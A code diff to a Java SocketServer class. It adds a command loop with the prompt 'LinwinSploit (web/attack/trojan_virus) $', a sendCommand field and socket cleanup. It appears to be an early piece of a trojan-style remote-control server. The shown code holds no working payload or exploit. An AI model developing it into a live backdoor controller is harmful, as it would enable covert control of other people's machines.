@@ -1,4 +1,6 @@
 
+import org.omg.PortableInterceptor.SYSTEM_EXCEPTION;
+
 import java.io.*;
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -10,13 +12,16 @@ import java.util.concurrent.Future;
 
 public class SocketServer {
     public static boolean connect = false;
+    public static String sendCommand = "none";
     public static void main(String[] args) {
         Thread options = new Thread(new Runnable() {
             @Override
             public void run() {
-                Scanner scanner = new Scanner(System.in);
-                String command = scanner.nextLine();
-
+                while (true) {
+                    System.out.print("LinwinSploit (web/attack/trojan_virus) $ ");
+                    Scanner scanner = new Scanner(System.in);
+                    String command = scanner.nextLine();
+                }
             }
         });
         options.start();
@@ -42,9 +47,13 @@ public class SocketServer {
                             if (message == null) {
                                 break;
                             }
-                            System.out.println(message);
+                            
                         }
                         bufferedReader.close();
+                        socket.shutdownInput();
+                        socket.shutdownOutput();
+                        socket.close();
+                        SocketServer.sendCommand = "none";
 
                         return 0;
                     }
@@ -52,7 +61,9 @@ public class SocketServer {
             }
         }
         catch (Exception exception) {
-            System.out.println("ERROR");
+            exception.printStackTrace();
+            System.out.println("ERROR"+exception.getMessage());
+            System.exit(1);
         }
     }
 }
